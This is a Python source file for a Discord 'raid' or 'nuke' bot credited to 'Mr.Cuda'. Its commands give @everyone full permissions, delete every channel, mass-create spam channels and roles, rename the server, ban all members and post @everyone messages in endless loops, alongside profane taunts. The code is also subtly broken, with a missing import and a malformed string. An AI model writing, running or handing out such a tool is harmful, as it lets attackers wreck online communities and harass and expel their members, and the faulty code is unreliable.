import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio
import os
import json
from threading import Thread
import requests
from discord.utils import get
import time


intents = discord.Intents.default()
intents.members = True


if not os.path.isfile("config.json"):
    sys.exit("'Please Add the token on the config.json file")
else:
    with open("config.json") as file:
        config = json.load(file)


SPAM_CHANNEL = ["LMAO RAIDED BY Mr.Cuda", "FUCKED UP"]
SPAM_MESSAGE = ["@everyone I love this raid", "@everyone" "]
webhook_usernames = [
    "LOSER", "SERVER FUCKED UP", "Bro got raid",
    "LOL",
]
client = commands.Bot(command_prefix="!", intents=intents)

@client.event
async def on_ready():
    print('''
Discord Raid made by Mr.Cuda :)
 ''')
    await client.change_presence(activity=discord.Game(name="what is this?"))


@client.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.bot.logout()
    print(Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)


@client.command()
async def nukeserver(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all())
        print("members can do what they want now")
    except:
        print("@everyone")
    for channel in guild.channels:
        try:
            await channel.delete()
            print("DELETING CHANNELS")
        except:
            print("failed to delete a channel")
    for role in guild.roles:
        try:
            await ctx.guild.create_role(name="Fucked up")
            print("role created successfully")
        except:
            print("failed to spam a role")
    await guild.create_text_channel("FUCK YOU")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age=0, max_uses=0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"nuked {guild.name}")
    return
@client.command()
async def nukespam(ctx):
    while True:
        await ctx.message.delete()
        await ctx.guild.create_role("Raid by Mr.Cuda")
        print("Spamming roles")


@client.command()
async def nukename(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    await ctx.guild.edit(name="SERVER NUKED BY Mr.Cuda")
    print("Name Changed")
    latters = "a:b:c:d:e:f:g:h:i:j:k:l:m:n:o:p:q:r:s:t:u:v:w:x:y:,:+:*:/:#: "
    lattersL = latters.split()



@client.command()
async def nukeban(ctx):
 await ctx.message.delete()
 print("Banned All Members")
 for user in ctx.guild.members:
        try:
            await user.ban()
        except:
           pass



@client.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(random.choice(SPAM_MESSAGE))

client.run(config["token"])
